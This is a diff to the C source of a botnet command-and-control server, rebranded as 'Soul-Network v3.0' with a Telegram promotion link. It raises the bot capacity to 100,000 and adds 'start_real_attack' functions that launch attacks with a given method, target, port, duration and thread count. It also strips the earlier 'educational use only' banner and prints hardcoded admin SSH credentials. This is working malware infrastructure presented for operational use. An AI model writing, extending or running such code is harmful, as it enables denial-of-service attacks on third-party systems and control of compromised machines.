@@ -15,13 +15,13 @@
 #include "network_utils.h"
 #include "ssh_service.h"
 
-#define CNC_PORT 1337
-#define MAX_BOTS 1000
+#define CNC_PORT 1930
+#define MAX_BOTS 100000
 #define MAX_ATTACKS 50
 #define MAX_CMD_SIZE 1024
 
 // Bot structure
-typedef struct {
+typedef struct bot_s {
     char id[20];
     char ip[16];
     int port;
@@ -32,7 +32,7 @@ typedef struct {
 } bot_t;
 
 // Attack structure
-typedef struct {
+typedef struct attack_s {
     int id;
     char method[50];
     char target[256];
@@ -70,9 +70,18 @@ void print_welcome_message();
 void print_help();
 void print_methods();
 
+// SSH Service data access functions
+bot_t* get_bots_list(void);
+int get_bot_count(void);
+attack_t* get_attacks_list(void);
+int get_attack_count(void);
+void start_real_attack(const char* method, const char* target, int port, int duration, int threads);
+void stop_real_attack(int attack_id);
+void stop_all_real_attacks(void);
+
 void signal_handler(int sig) {
     (void)sig; // Mark parameter as used to avoid warning
-    printf("\n\033[1;33m[*] Shutting down C&C server...\033[0m\n");
+    printf("\n\033[1;33m[*] Shutting down server...\033[0m\n");
     cnc_running = 0;
 }
 
@@ -83,7 +92,7 @@ void print_cnc_status() {
     time_str[24] = '\0'; // Remove newline
     
     printf("\033[1;36m");
-    printf("┌────────────────────── C&C SERVER STATUS ──────────────────────┐\n");
+    printf("┌────────────────────── Soul SERVER STATUS ──────────────────────┐\n");
     printf("│ Running Time:    %-40s │\n", time_str);
     printf("│ Connected Bots:  %-40d │\n", bot_count);
     printf("│ Active Attacks:  %-40d │\n", attack_count);
@@ -418,7 +427,7 @@ void* cnc_bot_listener(void* arg) {
         return NULL;
     }
     
-    printf("\033[1;32m[+] C&C Bot listener started on port %d\033[0m\n", CNC_PORT);
+    printf("\033[1;32m[+] Soul Bot listener started on port %d\033[0m\n", CNC_PORT);
     
     while (cnc_running) {
         struct sockaddr_in client_addr;
@@ -461,19 +470,19 @@ void start_ssh_in_thread() {
 void print_welcome_message() {
     printf("\033[1;35m");
     printf("╔════════════════════════════════════════════════════════════════╗\n");
-    printf("║                   BOTNET C&C SERVER v2.0                       ║\n");
-    printf("║                     EDUCATIONAL USE ONLY                       ║\n");
-    printf("║                      YOUR SERVERS ONLY                         ║\n");
+    printf("║                          Soul-Network v3.0                     ║\n");
+    printf("║                     join my telegram: https://t.me/yonqv168    ║\n");
+    printf("║                         Soul-Network (Raw Power🔥)             ║\n");
     printf("║                                                                ║\n");
-    printf("║                    Server Initialized                          ║\n");
-    printf("║                 Ready for connections...                       ║\n");
+    printf("║                         Server Initialized                     ║\n");
+    printf("║                        Ready for connections...                ║\n");
     printf("╚════════════════════════════════════════════════════════════════╝\n");
     printf("\033[0m");
 }
 
 void print_help() {
     printf("\033[1;36m");
-    printf("┌────────────────────── C&C COMMANDS ───────────────────────────┐\n");
+    printf("┌────────────────────── CNC COMMANDS ───────────────────────────┐\n");
     printf("│ help                    - Show this help message              │\n");
     printf("│ status                  - Show server status                  │\n");
     printf("│ bots                    - List connected bots                 │\n");
@@ -554,7 +563,7 @@ void command_interface() {
             print_welcome_message();
         }
         else if (strcmp(command, "exit") == 0) {
-            printf("\033[1;33m[*] Shutting down C&C server...\033[0m\n");
+            printf("\033[1;33m[*] Shutting down CNC server...\033[0m\n");
             cnc_running = 0;
             break;
         }
@@ -565,6 +574,37 @@ void command_interface() {
     }
 }
 
+// SSH Service data access functions
+bot_t* get_bots_list(void) {
+    return bots;
+}
+
+int get_bot_count(void) {
+    return bot_count;
+}
+
+attack_t* get_attacks_list(void) {
+    return attacks;
+}
+
+int get_attack_count(void) {
+    return attack_count;
+}
+
+void start_real_attack(const char* method, const char* target, int port, int duration, int threads) {
+    char command[1024];
+    snprintf(command, sizeof(command), "attack %s %s %d %d %d", method, target, port, duration, threads);
+    start_attack_command(command);
+}
+
+void stop_real_attack(int attack_id) {
+    stop_attack_command(attack_id);
+}
+
+void stop_all_real_attacks(void) {
+    stop_all_attacks();
+}
+
 int main() {
     // Set signal handlers
     signal(SIGINT, signal_handler);
@@ -572,7 +612,7 @@ int main() {
     
     // Show banner and initialize
     print_banner();
-    printf("\033[1;33m[*] Initializing C&C Server...\033[0m\n");
+    printf("\033[1;33m[*] Initializing CNC Server...\033[0m\n");
     print_loading(3);
     
     // Load attack history
@@ -597,11 +637,11 @@ int main() {
     print_welcome_message();
     print_cnc_status();
     
-    printf("\033[1;35m[+] C&C Server fully operational!\033[0m\n");
+    printf("\033[1;35m[+] CNC Server fully operational!\033[0m\n");
     printf("\033[1;36m[+] Bot connections on port: %d\033[0m\n", CNC_PORT);
     printf("\033[1;36m[+] SSH access on port: %d\033[0m\n", SSH_PORT);
-    printf("\033[1;33m[+] SSH Credentials: admin/admin123 or user/user123\033[0m\n");
-    printf("\033[1;32m[+] Connect with: ssh -p %d admin@<server_ip>\033[0m\n", SSH_PORT);
+    printf("\033[1;33m[+] SSH Credentials: admin/admin123 \033[0m\n");
+    printf("\033[1;32m[+] Connect with: ssh  admin@<ur ip>\033[0m\n", SSH_PORT);
     printf("\033[1;32m[+] Or use Putty to connect to port %d\033[0m\n\n", SSH_PORT);
     
     // Start command interface
